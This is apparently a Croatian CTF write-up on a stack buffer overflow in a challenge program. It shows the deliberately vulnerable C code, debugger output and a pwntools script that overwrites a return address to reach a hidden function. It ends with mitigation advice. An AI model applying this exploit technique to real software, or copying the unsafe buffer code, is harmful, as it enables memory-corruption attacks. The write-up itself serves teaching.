# Writeup

## Otkrivanje ranjivosti
Detaljnom analizom izvornog koda programa, uočena je potencijalna ranjivost programa **stack buffer overflow** kod promijene zone.

```
void promijeniZonu(){
	char priv[4];
	printf("Unesi novu zonu (3 znaka):\n");
	fgets(priv,44,stdin);
	strcpy(trenutnaZona,priv);
	printf("Zona promijenjena!\n");
}
```

U programu se za unos nove zone rezervira polje veličine 4 bajta, a pomoću funkcije fgets se na rezervirano polje zapisuje maksimalno 44 bajta.

Pomoću programa ```checksec``` mogu se provjeriti zaštite kompajliranog programa.

```
└─$ checksec --file=poruka    
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   2258 Symbols      No    0               0               poruka
```

Iz rezultata postojećih zaštita se može vidjeti da kompajlirani program ne sadrži PIE zaštitu.

## Objašnjenje ranjivosti

Kad je PIE omogućen, sustav koristi tehnologiju poput ASLR (Address Space Layout Randomization) za nasumično raspoređivanje adresa programa (npr. adrese funkcija, varijabla, stog...).
Na taj način, čak i ako napadač uspije izvršiti napade, neće moći predvidjeti gdje će se funkcije ili kritični podaci nalaziti u memoriji.
Zbog toga što program ne sadrži PIE, može se preurediti povratna adresa funkcije promijeniZonu na bilo koji drugu adresu.
To je moguće zbog toga što program pomoću fgets upisuje podatke izvan buffera.
U ovom slučaju želimo program preusmjeriti na adresu funkcije ispisiTajnuPoruku.
Potrebno je odrediti koji dio korisničkog unosa preuređuje povratnu adresu funkcije.
Za to se može koristiti program ```gdb``` u kombinaciji s ```pwndbg```.

Prvo treba pogledati na kojoj adresi se nalazi buffer:

```
─────────[ DISASM / x86-64 / set emulate on ]────────── 
 ► 0x401a2a <promijeniZonu+42> call fgets <fgets>
        s: 0x7fffffffddac <-- 0xffffddd000000000
		n: 0x2c
        stream: 0x4c45c0 (_IO_2_1_stdin_) <-- 0xfbad2288
```

Adresa gdje se nalazi naš buffer je ```0x7fffffffddac```.
Broj bajtova koje zapisujemo je ```0x2c```  (decimalno je to 44).

Zatim treba pogledati gdje se na stogu nalazi povratna adresa funkcije promijeniZonu:
```
────────[ STACK ]─────────
00:0000│ rsp         0x7fffffffdda0 —▸ 0x7fffffffddb0 —▸ 0x7fffffffddd0 ◂— 1
01:0008│ rax-4 rdi-4 0x7fffffffdda8 —▸ 0x401d45 (ocistiUlazniBuffer+10) ◂— cmp eax, 0xa
02:0010│ rbp         0x7fffffffddb0 —▸ 0x7fffffffddd0 ◂— 1
03:0018│+008         0x7fffffffddb8 —▸ 0x402172 (main+302) ◂— jmp main+320
```

Povratna adresa funkcije se uvijek nalazi ispod rbp. U ovom slučaju, povratna adresa funkcije promijeniZonu se nalazi na ```0x7fffffffddb8```.

Da bi se izračunao potreban padding (udaljenost korisničkog unosa), potrebno je oduzeti adresu mjesta povratne adrese funkcije i adresu na kojoj se nalazi buffer.

```ddb8 - ddac = C = 12```

Izračunati padding je 12 bajtova. 
Sada je potrebno nakon 12 bajtova korisničkog unosa unijeti adresu funkcije ispisiTajnuPoruku.


## Iskorištenje ranjivosti


Za izradu rješenja može se napraviti Python skripta koja iskorištava stack buffer overflow ranjivost u zadatku.
Skripta koristi ```pwntools``` biblioteku za interakciju s kompajliranim programom, omogućujući slanje podataka i primanje odgovora od procesa pokrenutog programa. 
Nakon pokretanja programa, skripta odabire opciju promijene zone (3) i zatim za novu zonu unosi korisnički unos koji preusmjerava izvođenje programa na adresu funkcije ispisiTajnuPoruku.


```
from pwn import *

io = process("./poruka")
elf = ELF("./poruka")

# = = = START

print(io.recvuntil(b"Odabir:"))
io.sendline(b"3")

print(io.recvuntil(b"Unesi novu zonu (3 znaka):"))

payload = b""
padding = b"A" * 12
ispisiTajnuPoruku = p64(elf.sym["ispisiTajnuPoruku"])
#elf.sym["naziv"] = funkcije i varijable se zovu simboli, to uzme adresu tog simbola kao
#p64() = pakiraj ova 64 bita u format koji će naš kompjuter moći pročitati (jer on koristi little endian)

payload += padding + ispisiTajnuPoruku

# = = = END
io.sendline(payload)
print(payload)

io.interactive()

```


Pokretanjem ove skripte, ispiše se flag ```CTFFOI[TYP0_Ov3rFl0w]```

## Edukacijske smjernice
- Stack buffer overflow je napad kod kojeg unos veći od rezerviranog buffera prepiše podatke na stogu (npr. povratnu adresu) i omogućuje napadaču da promijeni tok izvršavanja programa.
- Za zaštitu od ove ranjivosti preporučuje se:
   - Pažljivo provjeriti veličine buffera i memorije koja se u njih zapisuje
   - Provjeriti duljinu korisničkog unosa prije njegovog kopiranja u buffer
   - Uključiti stack canary (kompajlirati s -fstack-protector-strong) koji detektira prepisivanje stoga i tada prekida izvođenje programa.
   - Omogućiti NX (-z noexec) kako bi spriječili izvršavanje koda na stogu.
   - Uključiti PIE/ASLR (-fPIE -pie) za nasumično raspoređivanje adresa u memoriji.
